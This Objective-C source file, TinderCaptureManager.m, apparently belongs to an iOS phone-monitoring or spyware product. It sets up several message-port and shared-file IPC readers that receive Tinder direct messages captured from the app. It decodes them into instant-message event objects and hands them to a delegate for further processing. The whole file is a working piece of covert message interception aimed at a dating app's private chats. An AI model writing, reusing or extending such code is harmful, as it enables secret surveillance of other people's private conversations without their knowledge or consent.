//
//  TinderCaptureManager.m
//  TinderCaptureManager
//
//  Created by Khaneid Hantanasiriskul on 7/22/2559 BE.
//  Copyright © 2559 Khaneid Hantanasiriskul. All rights reserved.
//

#import "TinderCaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"

#import <UIKit/UIKit.h>

@implementation TinderCaptureManager

@synthesize mEventDelegate;

- (id)init
{
    self = [super init];
    if (self) {
        
    }
    return self;
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    [self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
    [self setMEventDelegate:nil];
}


- (void) startCapture {
    DLog (@"Start capture Tinder Direct messenger");
    if (!mMessagePortReader1) {
        mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kTinderMessagePort1
                                                  withMessagePortIPCDelegate:self];
        [mMessagePortReader1 start];
    }
    if (!mMessagePortReader2) {
        mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kTinderMessagePort2
                                                  withMessagePortIPCDelegate:self];
        [mMessagePortReader2 start];
    }
    if (!mMessagePortReader3) {
        mMessagePortReader3 = [[MessagePortIPCReader alloc] initWithPortName:kTinderMessagePort3
                                                  withMessagePortIPCDelegate:self];
        [mMessagePortReader3 start];
    }
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
        if (mSharedFileReader1 == nil) {
            mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kTinderMessagePort1
                                                                         withDelegate:self];
            [mSharedFileReader1 start];
        }
    }
}

- (void) stopCapture {
    DLog (@"Stop capture Tinder Message");
    if (mMessagePortReader1) {
        [mMessagePortReader1 stop];
        mMessagePortReader1 = nil;
    }
    if (mMessagePortReader2) {
        [mMessagePortReader2 stop];
        mMessagePortReader2 = nil;
    }
    if (mMessagePortReader3) {
        [mMessagePortReader3 stop];
        mMessagePortReader3 = nil;
    }
    
    if (mSharedFileReader1 != nil) {
        [mSharedFileReader1 stop];
        mSharedFileReader1 = nil;
    }
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
    NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kTinderArchived];
    DLog(@"Tinder - imEvent = %@", imEvent)
    [unarchiver finishDecoding];
    
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];
        for (FxEvent *imStructureEvent in imStructureEvents) {
            DLog (@"sending %@ ...", imStructureEvent)
            [mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];
        }
    }
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
    [self dataDidReceivedFromMessagePort:aRawData];
}

- (void) dealloc {
    [self stopCapture];
}


@end
